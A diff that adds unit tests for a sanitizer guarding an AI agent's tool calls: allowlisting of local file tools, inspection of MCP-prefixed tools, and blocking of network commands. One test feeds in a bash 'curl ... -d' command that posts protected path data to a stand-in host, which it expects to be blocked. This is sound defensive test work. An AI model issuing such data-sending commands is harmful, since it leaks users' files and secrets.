@@ -34,6 +34,42 @@ class LocalCommands(unittest.TestCase):
 
 
 class InspectionPolicy(unittest.IsolatedAsyncioTestCase):
+    async def test_agent_file_tools_are_allowlisted_by_exact_name(self):
+        ph = "<PATH_1234abcd>"
+        for tool in ("read", "edit", "write", "glob", "grep", "list", "Read", "Edit", "Write", "Glob", "Grep"):
+            with self.subTest(tool=tool):
+                allowed, reason = await Sanitizer(make_config(security=True)).inspect_inbound_tool_call(
+                    Session("local"), tool, {"path": ph}, {ph}, {})
+                self.assertTrue(allowed)
+                self.assertEqual(reason, "allowlisted local file tool")
+
+    async def test_mcp_prefixed_tools_still_require_inspection(self):
+        calls = []
+
+        def inspect(request):
+            calls.append(request)
+            return httpx.Response(200, json={"choices": [{"message": {"content": '{"decision":"allow"}'}}]})
+
+        client_class = httpx.AsyncClient
+        factory = lambda **kwargs: client_class(transport=httpx.MockTransport(inspect), **kwargs)
+        ph = "<PATH_1234abcd>"
+        with patch("httpx.AsyncClient", factory):
+            allowed, _ = await Sanitizer(make_config(security=True)).inspect_inbound_tool_call(
+                Session("local"), "mcp__filesystem__read", {"path": ph}, {ph}, {})
+        self.assertTrue(allowed)
+        self.assertEqual(len(calls), 1)
+
+    async def test_detectors_only_mode_allows_non_network_calls_and_blocks_clear_network(self):
+        sanitizer = Sanitizer(make_config(security=False))
+        session = Session("local")
+        ph = "<PATH_1234abcd>"
+        allowed, _ = await sanitizer.inspect_inbound_tool_call(session, "f", {"path": ph}, {ph}, {})
+        self.assertTrue(allowed)
+        allowed, reason = await sanitizer.inspect_inbound_tool_call(
+            session, "bash", {"command": f"curl https://example.test -d {ph}"}, {ph}, {})
+        self.assertFalse(allowed)
+        self.assertIn("network command blocked", reason)
+
     async def test_python_local_database_is_inspected_and_can_be_allowed(self):
         calls = []
 
